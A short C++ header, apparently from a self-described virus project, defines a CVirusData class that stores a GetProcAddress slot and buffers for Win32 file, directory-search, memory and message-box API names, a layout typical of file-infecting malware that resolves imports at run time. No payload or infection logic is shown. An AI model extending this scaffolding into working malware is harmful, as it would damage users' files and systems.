#ifndef HEADER_UTILS
#define HEADER_UTILS

#include "types.hpp"

constexpr TYPE_SIZE strlen1(const char* pBuf) {
	TYPE_SIZE i = 0;
	while (true) {
		if (pBuf[i++] == '\0') break;
	}
	return i;
}

#define STRLENINC(x) strlen1(x)+1


class CVirusData {
public:
	//Funcs addrs
	void* addr_GetProcAddress;

	//Functions names
	char funcname_GetProcAddress[STRLENINC("GetProcAddress")]="GetProcAddress"; //DEBUG
	char funcname_CreateFileA[STRLENINC("CreateFileA")];
	char funcname_ReadFile[STRLENINC("ReadFile")];
	char funcname_SetFilePointer[STRLENINC("SetFilePointer")];
	char funcname_WriteFile[STRLENINC("WriteFile") ];
	char funcname_CloseHandle[STRLENINC("CloseHandle") ];
	char funcname_LocalAlloc[STRLENINC("LocalAlloc") ];
	char funcname_LocalFree[STRLENINC("LocalFree") ];
	char funcname_FindFirstFileA[STRLENINC("FindFirstFileA") ];
	char funcname_FindNextFileA[STRLENINC("FindNextFileA") ];
	char funcname_GetLastError[STRLENINC("GetLastError") ];
	char funcname_MessageBoxA[STRLENINC("MessageBoxA") ];
};



#endif